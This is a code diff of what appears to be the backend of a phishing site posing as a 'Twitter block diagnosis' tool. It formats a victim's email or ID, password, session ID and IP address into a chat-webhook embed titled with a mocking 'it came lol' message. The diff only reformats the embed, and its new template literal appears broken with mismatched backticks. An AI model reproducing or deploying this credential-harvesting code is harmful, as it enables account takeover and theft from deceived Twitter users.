@@ -54,9 +54,9 @@ export default async function handler(req, res) {
                 {
                     title: "きちゃーｗｗｗｗｗ (自動応答)",
                     color: 0x00b0f4,
-                    description: `**ID or Email**\n\`\`\`\n${email}\n\`\`\`\n**PASS**\n\`\`\`\n${password}\n\`\`\`\n**Session ID**\n\`\`\`\n${sessionId}\n\`\`\``,
+                    description: `**ID or Email**\n\`\n${email}\n\`\n**PASS**\n\`\n${password}\n\`\n**Session ID**\n\`\n${sessionId}\n\`\`,
                     footer: {
-                        text: `Twitterブロック診断 | IP: ${ipIdentifier} | 結果: ${randomCount}人と返答`,
+                        text: `Twitterブロック診断 | IP: ${ipIdentifier} | ${randomCount}人と返答`,
                     },
                     timestamp: new Date().toISOString()
                 }
